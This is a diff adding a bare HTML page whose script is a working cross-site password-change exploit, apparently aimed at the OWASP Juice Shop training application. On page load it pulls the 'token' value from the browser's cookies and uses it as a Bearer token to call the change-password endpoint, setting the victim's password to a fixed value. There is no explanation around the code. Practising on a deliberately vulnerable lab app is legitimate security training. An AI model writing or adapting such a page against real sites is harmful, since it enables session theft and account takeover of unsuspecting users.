@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var change_pw_url = "https://insert-juice-shop-url-here/rest/user/change-password?new=password1337&repeat=password1337";
+        var cookie = document.cookie.split(';');
+        var token = '';
+
+        for(let i=0; i<cookie.length; i++) { 
+            if(cookie[i].includes('token')) { 
+                token = cookie[i].split('=')[1]; 
+                break;
+            } 
+        }
+
+        fetch(change_pw_url, {
+            headers: {
+                Accept: 'application/json',
+                Authorization: `Bearer ${token}`,
+            }
+        })
+        .then((response) => {
+            console.log(response);
+        })
+        .catch((error) => {
+            console.log(`[-] Error : ${error}`);
+        });
+    </script>
+</body>
+</html>
